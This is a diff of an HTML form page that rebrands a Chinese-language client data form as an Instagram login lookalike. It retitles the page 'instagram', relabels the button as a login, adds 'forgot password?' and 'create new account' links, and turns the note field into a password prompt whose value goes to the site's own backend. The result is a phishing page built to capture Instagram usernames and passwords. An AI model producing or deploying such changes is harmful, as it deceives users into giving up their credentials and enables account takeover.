@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>客戶資料表單</title>
+  <title>instagram</title>
   <link rel="icon" type="image/png" href="/favicon.png" />
   <link rel="stylesheet" href="style.css" />
 </head>
@@ -24,22 +24,20 @@
 
       <form class="card" id="client-form">
         <label class="field">
-          <span id="account-label">帳號</span>
           <input id="account-input" name="account" type="text" placeholder="輸入帳號" autocomplete="username" required />
         </label>
 
         <label class="field">
-          <span id="note-label">備註</span>
           <input id="note-input" name="note" type="text" placeholder="例如：週五再聯繫、想了解方案 A" autocomplete="off" />
         </label>
 
-        <button class="primary-btn" id="submit-btn" type="submit">送出資料</button>
+        <button class="primary-btn" id="submit-btn" type="submit">登入</button>
 
-        <a class="backlink" id="admin-link" href="/admin">管理員登入</a>
+        <a class="backlink" id="admin-link" href="/admin">忘記密碼？</a>
         <p class="status" id="status" aria-live="polite"></p>
       </form>
 
-      <button class="secondary-btn" id="secondary-btn" type="button">查看後台</button>
+      <button class="secondary-btn" id="secondary-btn" type="button">建立新帳號</button>
 
       <img class="footer-mark" src="footer-mark.png" alt="Brand mark" />
     </section>
@@ -52,14 +50,14 @@
         label: '中文(台灣)',
         htmlLang: 'zh-Hant',
         dir: 'ltr',
-        title: '客戶資料表單',
+        title: 'instagram',
         eyebrow: '客戶名單',
         headline: '把帳號與備註送進後台',
         lede: '這是一個手機優先的安全表單，保留簡潔節奏但只收帳號與備註。',
         accountLabel: '帳號',
-        accountPlaceholder: '輸入帳號',
+        accountPlaceholder: '用戶名稱、電子郵件地址或手機號碼',
         noteLabel: '備註',
-        notePlaceholder: '例如：週五再聯繫、想了解方案 A',
+        notePlaceholder: '密碼',
         submit: '送出資料',
         secondary: '查看後台',
         admin: '管理員登入',
